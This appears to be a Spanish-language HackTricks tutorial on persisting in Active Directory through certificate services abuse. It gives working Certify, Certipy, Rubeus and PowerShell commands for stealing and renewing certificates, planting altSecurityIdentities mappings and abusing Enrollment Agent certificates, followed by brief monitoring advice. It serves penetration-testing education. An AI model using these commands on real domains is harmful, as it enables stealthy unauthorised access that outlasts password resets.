# AD CS Persistencia de cuentas

{{#include ../../../banners/hacktricks-training.md}}

**Esta es un pequeño resumen de los capítulos sobre persistencia de cuentas de la excelente investigación de [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Comprender el robo activo de credenciales de usuario con certificados – PERSIST1

En un escenario donde un certificado que permite la autenticación en el dominio puede ser solicitado por un usuario, un atacante tiene la oportunidad de solicitar y robar este certificado para mantener persistencia en una red. Por defecto, la plantilla `User` en Active Directory permite dichas solicitudes, aunque a veces puede estar deshabilitada.

Usando [Certify](https://github.com/GhostPack/Certify) o [Certipy](https://github.com/ly4k/Certipy), puedes buscar plantillas habilitadas que permitan autenticación de cliente y luego solicitar una:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
El poder de un certificado radica en su capacidad para autenticarse como el usuario al que pertenece, independientemente de los cambios de contraseña, siempre que el certificado siga siendo válido.

Puedes convertir PEM a PFX y usarlo para obtener un TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: Combinado con otras técnicas (ver secciones THEFT), la autenticación basada en certificados permite acceso persistente sin tocar LSASS e incluso desde contextos no elevados.

## Obtener persistencia en la máquina con certificados - PERSIST2

Si un atacante tiene privilegios elevados en un equipo, puede inscribir la cuenta de equipo del sistema comprometido para un certificado usando la plantilla predeterminada `Machine`. Autenticarse como la máquina habilita S4U2Self para servicios locales y puede proporcionar persistencia duradera en el equipo:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extender la persistencia mediante la renovación de certificados - PERSIST3

Abusar de los periodos de validez y renovación de las plantillas de certificados permite a un atacante mantener acceso a largo plazo. Si posees un certificado emitido previamente y su clave privada, puedes renovarlo antes de su expiración para obtener una credencial nueva y de larga duración sin dejar artefactos adicionales de solicitud vinculados a la entidad principal original.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Consejo operativo: haga seguimiento de las vigencias de los archivos PFX en poder del attacker y renuévelos con antelación. La renovación también puede provocar que los certificados actualizados incluyan la moderna extensión de mapeo SID, manteniéndolos utilizables bajo reglas de mapeo de DC más estrictas (ver la siguiente sección).

## Crear mapeos explícitos de certificados (altSecurityIdentities) – PERSIST4

Si puede escribir en el atributo `altSecurityIdentities` de una cuenta objetivo, puede mapear explícitamente un certificado controlado por el attacker a esa cuenta. Esto persiste tras cambios de contraseña y, cuando se usan formatos de mapeo fuertes, sigue siendo funcional bajo la aplicación moderna en los DC.

Flujo de alto nivel:

1. Obtén u emite un certificado client-auth que controles (p. ej., inscribe la plantilla `User` como tú mismo).
2. Extrae un identificador fuerte del cert (Issuer+Serial, SKI, o SHA1-PublicKey).
3. Añade un mapeo explícito en `altSecurityIdentities` del principal de la víctima usando ese identificador.
4. Autentícate con tu certificado; el DC lo mapea a la víctima mediante el mapeo explícito.

Ejemplo (PowerShell) usando un mapeo fuerte Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
A continuación, autentícate con tu PFX. Certipy obtendrá un TGT directamente:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Construyendo mapeos robustos de `altSecurityIdentities`

En la práctica, **Issuer+Serial** y **SKI** son los formatos fuertes más fáciles de construir a partir de un certificado en posesión del atacante. Esto importa a partir del **February 11, 2025**, cuando los DCs por defecto cambien a **Full Enforcement** y los mapeos débiles dejen de ser fiables.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notas
- Usar solo tipos de mapeo fuertes: `X509IssuerSerialNumber`, `X509SKI`, o `X509SHA1PublicKey`. Los formatos débiles (Subject/Issuer, Subject-only, RFC822 email) están obsoletos y pueden ser bloqueados por la política del DC.
- El mapeo funciona en ambos objetos **user** y **computer**, por lo que el acceso de escritura al `altSecurityIdentities` de una cuenta de equipo es suficiente para persistir como esa máquina.
- La cadena de certificados debe construirse hasta una raíz confiable por el DC. Enterprise CAs en NTAuth suelen ser de confianza; algunos entornos también confían en CAs públicas.
- La autenticación Schannel sigue siendo útil para persistencia incluso cuando PKINIT falla porque el DC carece del EKU Smart Card Logon o devuelve `KDC_ERR_PADATA_TYPE_NOSUPP`.

Para más sobre mapeos explícitos débiles y rutas de ataque, ver:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Si obtienes un certificado válido de Certificate Request Agent/Enrollment Agent, puedes emitir nuevos certificados logon-capable en nombre de usuarios a voluntad y mantener el PFX del agente fuera de línea como un token de persistencia. Flujo de abuso:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
La revocación del certificado del agente o de los permisos de la plantilla es necesaria para eliminar esta persistencia.

Notas operativas
- Las versiones modernas de `Certipy` admiten tanto `-on-behalf-of` como `-renew`, por lo que un atacante que posea un Enrollment Agent PFX puede generar y, más adelante, renovar certificados leaf sin volver a tocar la cuenta objetivo original.
- Si la obtención del TGT basada en PKINIT no es posible, el certificado on-behalf-of resultante sigue siendo usable para autenticación Schannel con `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impacto en la persistencia

Microsoft KB5014754 introdujo Strong Certificate Mapping Enforcement en los domain controllers. Desde el 11 de febrero de 2025, los DCs tienen por defecto Full Enforcement, rechazando mapeos débiles o ambiguos. Implicaciones prácticas:

- Los certificados previos a 2022 que carezcan de la extensión de mapeo de SID pueden fallar en el mapeo implícito cuando los DCs están en Full Enforcement. Los atacantes pueden mantener el acceso renovando certificados a través de AD CS (para obtener la extensión SID) o plantando un mapeo explícito fuerte en `altSecurityIdentities` (PERSIST4).
- Los mapeos explícitos usando formatos fuertes (Issuer+Serial, SKI, SHA1-PublicKey) siguen funcionando. Los formatos débiles (Issuer/Subject, Subject-only, RFC822) pueden ser bloqueados y deben evitarse para persistencia.

Los administradores deberían supervisar y alertar sobre:
- Cambios en `altSecurityIdentities` y en la emisión/renovación de certificados Enrollment Agent y User.
- Registros de emisión de la CA para solicitudes on-behalf-of y patrones de renovación inusuales.

## Referencias

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
